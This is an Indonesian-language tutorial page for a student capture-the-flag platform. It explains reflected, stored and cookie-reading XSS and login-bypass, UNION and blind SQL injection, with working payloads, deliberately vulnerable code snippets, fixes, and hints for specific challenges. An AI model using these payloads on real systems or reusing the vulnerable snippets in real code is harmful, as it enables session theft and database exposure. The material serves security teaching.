📚 Tutorial Cyber Security

Pelajari dasar-dasar XSS dan SQL Injection sebelum mengerjakan challenge.

🎯 Apa itu CTF (Capture The Flag)?

CTF adalah kompetisi keamanan siber di mana peserta mencari "flag" — sebuah string rahasia yang tersembunyi dalam sistem yang sengaja dibuat rentan.

Di platform ini, setiap challenge memiliki satu flag dengan format: CTF{...}

✅ Tujuan: Temukan flag, lalu submit di halaman challenge untuk mendapatkan poin!

📋 Aturan Platform

• Hanya boleh mengeksploitasi halaman challenge yang sudah disediakan (/vuln/...)

• Dilarang menyerang infrastruktur server atau database utama

• Dilarang berbagi flag dengan mahasiswa lain — kerjakan sendiri!

• Boleh berdiskusi tentang konsep dan teknik, tapi tidak boleh memberi flag langsung

🔴 Apa itu Cross-Site Scripting (XSS)?

XSS adalah serangan di mana penyerang menyuntikkan kode JavaScript berbahaya ke dalam halaman web. Kode ini kemudian dieksekusi oleh browser korban.

⚠️ XSS terjadi ketika aplikasi web menampilkan input pengguna TANPA melakukan sanitasi atau escaping terlebih dahulu.

📌 Tipe 1: Reflected XSS

Input langsung direfleksikan (ditampilkan kembali) ke halaman. Biasa terjadi di form pencarian atau parameter URL.

Contoh kode RENTAN:

// ❌ BERBAHAYA - Input langsung ke HTML!
const query = req.query.q;
res.send(`<p>Hasil: ${query}</p>`);

Payload yang bisa digunakan:

// Payload XSS klasik
<script>alert('XSS')</script>

// Jika script tag diblokir, gunakan event handler
<img src=x onerror=alert(document.cookie)>

// Membaca elemen tersembunyi
<img src=x onerror=alert(document.getElementById('flag-secret').innerText)>
💡 Di challenge XSS #1, flag tersembunyi di elemen dengan id="flag-secret". Gunakan XSS untuk membacanya!

📌 Tipe 2: Stored XSS

Payload XSS disimpan ke database dan dieksekusi setiap kali halaman dimuat. Lebih berbahaya karena tidak perlu interaksi khusus dari korban.

Contoh skenario: Form Komentar

// Penyerang mengisi form komentar dengan:
Nama: Hacker
Komentar: <script>document.cookie</script>

// Setiap pengunjung yang membuka halaman
// akan menjalankan script tersebut!
💡 Di challenge XSS #2, kirim payload XSS sebagai komentar. Flag ada di elemen tersembunyi di halaman buku tamu.

📌 Tipe 3: Cookie Stealing via XSS

Cookie yang tidak memiliki atribut HttpOnly bisa dibaca oleh JavaScript. Ini sangat berbahaya karena cookie sering menyimpan token sesi.

// Membaca semua cookie dengan JavaScript
alert(document.cookie);

// Sebagai XSS payload:
<img src=x onerror=alert(document.cookie)>
💡 Di challenge XSS #3, halaman menyimpan flag di cookie secret_flag. Gunakan XSS untuk membacanya!

🛡️ Cara Mencegah XSS

// ✅ AMAN - Selalu escape output HTML
function escapeHtml(str) {
  return str.replace(/&/g,'&amp;')
           .replace(/</g,'&lt;')
           .replace(/>/g,'&gt;');
}
res.send(`<p>Hasil: ${escapeHtml(query)}</p>`);

🔵 Apa itu SQL Injection?

SQL Injection adalah serangan di mana penyerang menyuntikkan perintah SQL ke dalam input aplikasi, sehingga database menjalankan perintah yang tidak diinginkan.

⚠️ SQLi terjadi ketika input pengguna digabungkan langsung ke dalam query SQL tanpa menggunakan parameterized query.

📌 Tipe 1: Login Bypass

Memanipulasi query login agar berhasil tanpa mengetahui password.

// Query RENTAN:
SELECT * FROM users
WHERE username='INPUT' AND password='INPUT'

// Jika username diisi: admin'--
// Query menjadi:
SELECT * FROM users
WHERE username='admin'--' AND password='...'

// -- adalah komentar SQL, password DIABAIKAN!
💡 Payload: admin'-- di field username. Isi password dengan apapun.

📌 Tipe 2: UNION-based SQLi

Menambahkan query UNION untuk mengambil data dari tabel lain.

// Query asal:
SELECT id, name, price, category FROM products
WHERE name LIKE '%INPUT%'

// Payload UNION (harus sama jumlah kolomnya: 4):
' UNION SELECT 1,secret_value,3,4 FROM ctf_secrets WHERE secret_name='flag_sqli2'--

// Query menjadi:
SELECT id, name, price, category FROM products
WHERE name LIKE '%%'
UNION SELECT 1,secret_value,3,4 FROM ctf_secrets ...
💡 Perhatikan jumlah kolom harus sama. Coba ' UNION SELECT 1,2,3,4-- dulu untuk verifikasi.

📌 Tipe 3: Blind SQL Injection

Tidak ada data yang ditampilkan. Kita hanya mendapat respons "benar" atau "salah" untuk menebak data satu karakter sekaligus.

// Query hanya mengembalikan "Ada" atau "Tidak Ada"
// Kita gunakan kondisi boolean:

// Apakah karakter pertama flag adalah 'C'?
' AND SUBSTRING(secret_value,1,1)='C'--

// Apakah karakter kedua adalah 'T'?
' AND SUBSTRING(secret_value,2,1)='T'--

// Terus sampai flag lengkap terungkap!
// Parameter: (string, posisi, panjang)
💡 Format flag selalu CTF{...}, jadi karakter 1-4 pasti C,T,F,{. Mulai dari karakter ke-5!

🛡️ Cara Mencegah SQL Injection

// ❌ BERBAHAYA
pool.query(`SELECT * FROM users WHERE username='${input}'`);

// ✅ AMAN - Gunakan Parameterized Query
pool.query('SELECT * FROM users WHERE username=$1', [input]);

🛠️ Tools yang Dibutuhkan

Semua challenge bisa diselesaikan hanya dengan browser! Berikut tools yang berguna:

🌐 Browser Developer Tools (F12)

Inspect elemen tersembunyi, lihat cookie, eksekusi JavaScript di Console.

📝 Browser Console

Jalankan JavaScript: document.cookie, document.getElementById('id').textContent

🔗 URL Bar

Manipulasi parameter URL langsung: /vuln/xss-1?q=<payload>

💡 Tips Mengerjakan Challenge

1. Baca deskripsi challenge dengan teliti

2. Gunakan hint yang tersedia (klik tombol "Tampilkan Hint")

3. Inspect source code halaman (Ctrl+U) untuk mencari clue

4. Cek Console browser (F12) untuk pesan error atau hidden info

5. Coba payload sederhana dulu, lalu modifikasi sesuai kebutuhan
